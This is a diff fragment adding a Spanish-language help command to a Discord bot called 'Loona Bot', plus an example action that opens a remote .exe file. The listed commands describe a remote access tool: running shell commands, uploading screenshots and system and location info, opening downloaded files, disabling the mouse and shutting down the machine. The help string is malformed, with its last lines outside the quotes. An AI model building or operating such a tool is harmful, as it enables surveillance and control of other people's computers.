@@ -14,3 +14,32 @@ Send an action through GITHUB
   "action": "openFile",
   "url": "https://tuservidor.com/file.exe"
 }
+
+
+
+@bot.command(name="help")
+async def custom_help(ctx):
+    help_message = (
+        "**🧠 Loona Bot - Command List:**\n"
+        "```ini\n"
+        "[!Loona]             - Verifica si el bot está en línea.\n"
+        "[!setWallpaper <url>] - Cambia el fondo de pantalla (solo roles permitidos).\n"
+        "[!popUp <mensaje>]   - Muestra un popup con un mensaje (solo roles permitidos).\n"
+        "[!openFile <url>]    - Abre un archivo desde una URL (solo roles permitidos).\n"
+        "[!openImage <url>]   - Abre una imagen desde una URL (solo roles permitidos).\n"
+        "[!uploadScreenshot]  - Sube una captura de pantalla (solo roles permitidos).\n"
+        "[!whoIamInfo]  - Sube un txt con info (solo roles permitidos).\n"
+        "[!openURL <url>]     - Abre una URL en el navegador (solo roles permitidos).\n"
+        "[!speakText <mensaje>] - Lee un texto en voz alta (solo roles permitidos).\n"
+        "[!changeVolume <0-100>] - Cambia el volumen del sistema (solo roles permitidos).\n"
+        "[!disableMouse]      - Desactiva el mouse (solo roles permitidos).\n"
+        "[!enableMouse]       - Activa el mouse (solo roles permitidos).\n"
+        "[!lockScreen]        - Bloquea la pantalla (solo roles permitidos).\n"
+        "[!shutdown]          - Apaga el sistema (solo roles permitidos).\n"
+        "[!restart]           - Reinicia el sistema (solo roles permitidos).\n"
+[!shellLoona <comando>] - Ejecuta un comando en shell (solo roles permitidos).
+[!whoIamInfo]           - Sube info del sistema y ubicación (solo roles permitidos).
+
+        "```"
+    )
+    await ctx.send(help_message)
